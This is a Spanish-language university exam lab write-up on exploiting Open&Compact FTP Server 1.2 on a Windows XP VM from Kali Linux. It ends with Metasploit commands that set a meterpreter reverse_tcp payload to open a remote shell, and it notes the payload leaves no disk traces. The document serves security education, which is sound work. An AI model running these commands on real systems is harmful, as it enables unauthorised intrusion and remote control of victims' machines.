# Parcial_Ciberseguridad
PARCIAL CIBERSEGURIDAD 2019 - CRISTHIAN CHICA A.

Vulnerabilidad:
Este modulo explota multiples vulnerabilidades en el servidor Open&Compact FTP, como omisión de autenticacion y vulnerabilidad en
la carga de archivos arbitrario, es decir que esto permite a un atacante remoto escribir archivos en el sistema de archivos siempre que un usuario tenga
permisos, este modulo solo funciona con versiones inferiores a Windows Vista.
Existe una perdida completa de la proteccion del sistema, lo que hace que este se vea comprometido, no es necesario estar autenticado
para explotar la vulnerabilidad

Sistema Operativo:
El sistema operativo desde el cual se hace el ataque es Kali-Linux y el sistema operativo victima es Windows XP SP3

Software:
A parte de las maquinas virtuales ->Kali-Linux y Windows XP SP3, se hace uso del software Open-ftpd.1.2

Instructivo:
Inicialmente procedemos a correr las maquinas virtuales ->Kali-Linux y Windows XP SP3, una vez hecho esto descargamos el Open&Compact
FTP Server 1.2 o inferior a esta, ya que el exploit solo funciona con estas versiones, lo pasamos a traves de la Carpeta Compartida a Kali-Linux para que de una vez abramos la consola y descomprimamos el archivo con extension tar.gz, hecho esto pasamos el archivo por medio de la carpeta compartida a la maquina virtual Windows XP SP3 y corremos el ejecutable "ftp.exe" con esto ya garantizamos el requisito para poder realizar el exploit, observamos que direccion ip tienen ambas maquinas, despues en Kali-Linux procedemos a cargar la consola de metasploit, seleccionamos el tipo de exploit que en ese caso es el "exploit/windows/ftp/open_ftpd_wbem" de ahi debemos de setear el tipo de payload que usaremos, en el caso utilizamos un payload de tipo stage para poder hacer uso del meterpreter que opera mediante inyeccion dll y no deja rastros en el disco duro, luego indicamos con lhost cual será la maquina atacante y con rhost cual sera la maquina victima, realizado esto procedemos a hacer el exploit, es decir, a hacer provecho de la vulnerabilidad de seguridad del sistema. Se crea la sesión del meterpreter y a partir de aquí ya accedo a la maquina victima.

COMANDOS:
msfconsole
use exploit/windows/ftp/open_ftpd_wbem
set payload windows/meterpreter/reverse_tcp
set lhost <ip_atacante>
set rhost <ip_victima>
exploit
meterpreter>sysinfo
meterpreter>shell
